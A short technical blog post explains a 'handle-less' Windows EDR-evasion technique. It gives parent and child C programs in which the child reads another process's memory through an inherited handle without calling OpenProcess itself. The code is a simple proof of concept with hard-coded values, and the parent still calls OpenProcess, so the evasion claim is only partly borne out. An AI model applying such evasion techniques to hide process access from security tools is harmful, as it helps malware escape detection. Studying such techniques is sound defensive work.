---
title: “handle-less” attack
published: 2026-05-13
tags: [Markdown, AntiVirus-Evasion, EDR-Evasion, Malware]
category: EDR-Evasion
draft: false
---


A “handle-less” attack in Windows usually refers to techniques that avoid obtaining a traditional Win32 handle to a target process/object via APIs like OpenProcess(). This is commonly used to evade EDR telemetry because many security products monitor:

- OpenProcess
- NtOpenProcess
- Handle creation callbacks (ObRegisterCallbacks)
- Access mask requests (PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, etc.)

One classic example is using inherited handles, duplicated handles from another process, or direct syscalls without creating a new observable handle.

Parent process create child:

```c title="Parent.c"
// parent.cpp
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1234; // target PID

    HANDLE hProc = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        TRUE, // inheritable
        pid
    );

    if (!hProc) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    // Make handle inheritable
    SetHandleInformation(hProc, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    char cmd[] = "child.exe";

    BOOL ok = CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE, // inherit handles
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!ok) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("Inherited handle value: %p\n", hProc);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
```


Child Process

The child never calls OpenProcess(). It simply uses the inherited handle.


```c title="child.c"
// child.cpp
#include <windows.h>
#include <stdio.h>

int main() {

    // Inherited handle value must be known/shared somehow.
    // In real malware this may be passed via IPC, env var, pipe, etc.
    HANDLE hProc = (HANDLE)0x00000000000000AC;

    BYTE buffer[16] = { 0 };
    SIZE_T bytesRead = 0;

    LPCVOID remoteAddr = (LPCVOID)0x7FF700000000;

    BOOL ok = ReadProcessMemory(
        hProc,
        remoteAddr,
        buffer,
        sizeof(buffer),
        &bytesRead
    );

    if (!ok) {
        printf("ReadProcessMemory failed: %lu\n", GetLastError());
        return 1;
    }

    printf("Read %zu bytes\n", bytesRead);

    return 0;
}
```


